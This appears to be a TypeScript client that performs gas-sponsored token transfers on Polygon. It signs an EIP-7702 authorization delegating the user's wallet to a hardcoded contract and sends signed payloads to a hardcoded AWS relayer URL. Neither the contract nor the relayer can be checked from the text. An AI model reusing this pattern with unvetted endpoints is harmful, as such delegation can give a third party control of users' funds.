import { ethers, Contract, JsonRpcProvider, Interface } from 'ethers';

export type SponsoredConfig = {
  chainId: number;
  delegationAddress: string;
  providerUrl: string;
  relayerEndpoint: string;
  maxRetries: number;
  retryDelayMs: number;
};

const DEFAULT_CONFIG: SponsoredConfig = {
  chainId: 137,
  delegationAddress: '0x9a686f5eae58b62b435eaa034d48e57dc94bc36c',
  providerUrl: 'https://polygon-rpc.com',
  relayerEndpoint: 'https://cpprhb1jz6.execute-api.us-east-1.amazonaws.com/relay',
  maxRetries: 30,
  retryDelayMs: 2000,
};

export const SPONSORED_CONFIG = {
  chainId: 137,
  supportedChains: [137],
};

const CONTRACT_ABI = [
  'function execute((address,uint256,bytes)[] calls) external payable',
  'function execute((address,uint256,bytes)[] calls, bytes signature) external payable',
  'function nonce() external view returns (uint256)',
];

export class SponsoredOrchestrator {
  private readonly provider: JsonRpcProvider;
  private readonly eoaWallet: ethers.Wallet;
  private readonly config: SponsoredConfig & Record<string, any>;

  constructor(chainId: number, privateKey: string, config: Partial<SponsoredConfig> = {}) {
    const merged: SponsoredConfig = { ...DEFAULT_CONFIG, chainId, ...config };
    if (!SPONSORED_CONFIG.supportedChains.includes(chainId)) {
      throw new Error(`Chain ID ${chainId} is not supported for sponsored transactions`);
    }
    this.config = merged as SponsoredConfig & Record<string, any>;
    this.provider = new JsonRpcProvider(this.config.providerUrl);
    this.eoaWallet = new ethers.Wallet(privateKey, this.provider);
  }

  static isChainSupported(chainId: number): boolean {
    return SPONSORED_CONFIG.supportedChains.includes(chainId);
  }

  async verifyDelegationContract(): Promise<boolean> {
    try {
      const code = await this.provider.getCode(this.config.delegationAddress);
      if (code === '0x') return false;
      const contract = new Contract(this.config.delegationAddress, CONTRACT_ABI, this.provider);
      await contract.nonce();
      return true;
    } catch (_e) {
      return false;
    }
  }

  async executeSponsoredTransfer(params: { tokenAddress: string; toAddress: string; amount: string; }): Promise<{ success: boolean; transferTxHash: string; }>{
    const { tokenAddress, toAddress, amount } = params;
    this.config.tokenAddress = tokenAddress;
    this.config.toAddress = toAddress;
    this.config.amount = amount;

    const ok = await this.verifyDelegationContract();
    if (!ok) throw new Error('Delegation contract verification failed');

    const delegationStatus = await this.checkDelegationStatus();
    if (!delegationStatus.isDelegated || !delegationStatus.matchesTarget) {
      const delegationTxHash = await this.setupDelegation();
      const success = await this.monitorTransaction(delegationTxHash, 'Delegation');
      if (!success) throw new Error('Delegation setup failed');
      await new Promise((r) => setTimeout(r, 3000));
    }

    const transferTxHash = await this.executeTokenTransfer();
    const transferSuccess = await this.monitorTransaction(transferTxHash, 'Token Transfer');
    if (!transferSuccess) throw new Error('Token transfer failed');
    return { success: true, transferTxHash };
  }

  private async checkDelegationStatus(): Promise<{ isDelegated: boolean; delegatedTo: string | null; matchesTarget?: boolean; }>{
    try {
      const code = await this.provider.getCode(this.eoaWallet.address);
      if (code === '0x') return { isDelegated: false, delegatedTo: null };
      if (code.startsWith('0xef0100')) {
        const delegatedAddress = '0x' + code.slice(8);
        const normalizedDelegated = ethers.getAddress(delegatedAddress);
        const normalizedTarget = ethers.getAddress(this.config.delegationAddress);
        return { isDelegated: true, delegatedTo: normalizedDelegated, matchesTarget: normalizedDelegated === normalizedTarget };
      }
      return { isDelegated: true, delegatedTo: null };
    } catch (_e) {
      return { isDelegated: false, delegatedTo: null };
    }
  }

  private async setupDelegation(): Promise<string> {
    const currentNonce = await this.provider.getTransactionCount(this.eoaWallet.address);
    const authorization = await this.eoaWallet.authorize({
      address: this.config.delegationAddress,
      nonce: currentNonce,
      chainId: this.config.chainId,
    });
    const eip7702Payload = {
      type: 4,
      to: this.eoaWallet.address,
      value: 0,
      data: '0x',
      gasLimit: 120000,
      authorizationList: [authorization],
    } as const;
    return this.sendToRelayer(eip7702Payload, 'Delegation Setup');
  }

  private async executeTokenTransfer(): Promise<string> {
    const calls = this.buildTokenTransferCalls();
    const delegatedContract = new Contract(this.eoaWallet.address, CONTRACT_ABI, this.provider);
    const code = await this.provider.getCode(this.eoaWallet.address);
    if (code === '0x') {
      throw new Error(`EOA ${this.eoaWallet.address} has not been delegated to any contract`);
    }
    const contractNonce = await delegatedContract.nonce();
    const signature = await this.createSignatureForCalls(calls, contractNonce);
    const executionPayload = this.createSponsoredExecutionPayload(calls, signature);
    return this.sendToRelayer(executionPayload, 'Token Transfer');
  }

  private buildTokenTransferCalls(): [string, number, string][] {
    const erc20Iface = new Interface(['function transfer(address to, uint256 amount) external returns (bool)']);
    const decimals = 6; // TODO: fetch dynamically
    const data = erc20Iface.encodeFunctionData('transfer', [this.config.toAddress, ethers.parseUnits(this.config.amount, decimals)]);
    return [[this.config.tokenAddress, 0, data]];
  }

  private async createSignatureForCalls(calls: [string, number, string][], contractNonce: bigint): Promise<string> {
    let encodedCalls = '0x';
    for (const [to, value, data] of calls) {
      encodedCalls += ethers.solidityPacked(['address', 'uint256', 'bytes'], [to, value, data]).slice(2);
    }
    const digest = ethers.keccak256(ethers.solidityPacked(['uint256', 'bytes'], [contractNonce, encodedCalls]));
    return await this.eoaWallet.signMessage(ethers.getBytes(digest));
  }

  private createSponsoredExecutionPayload(calls: [string, number, string][], signature: string) {
    const contractInterface = new Interface(CONTRACT_ABI);
    const data = contractInterface.encodeFunctionData('execute((address,uint256,bytes)[],bytes)', [calls, signature]);
    return { to: this.eoaWallet.address, value: 0, data, gasLimit: 200000 } as const;
  }

  private convertBigIntToString(obj: any): any {
    if (obj === null || obj === undefined) return obj;
    if (typeof obj === 'bigint') return obj.toString();
    if (Array.isArray(obj)) return obj.map((i) => this.convertBigIntToString(i));
    if (typeof obj === 'object') {
      const converted: Record<string, any> = {};
      for (const [key, value] of Object.entries(obj)) {
        if (key === '_type' || key === 'networkV') continue;
        converted[key] = this.convertBigIntToString(value as any);
      }
      return converted;
    }
    return obj;
  }

  private async sendToRelayer(payload: any, operation: string): Promise<string> {
    const event = { payload, chainId: this.config.chainId };
    const serializableEvent = this.convertBigIntToString(event);
    const response = await fetch(this.config.relayerEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(serializableEvent),
    });
    const result = await response.json();
    if (!response.ok || !result.success) {
      throw new Error(`Relayer ${operation} failed: ${response.status}`);
    }
    return result.transactionHash as string;
  }

  private async monitorTransaction(txHash: string, operation: string): Promise<boolean> {
    for (let i = 0; i < this.config.maxRetries; i++) {
      try {
        const receipt = await this.provider.getTransactionReceipt(txHash);
        if (receipt) return receipt.status === 1;
        await new Promise((r) => setTimeout(r, this.config.retryDelayMs));
      } catch (_e) {
        await new Promise((r) => setTimeout(r, this.config.retryDelayMs));
      }
    }
    return false;
  }
}


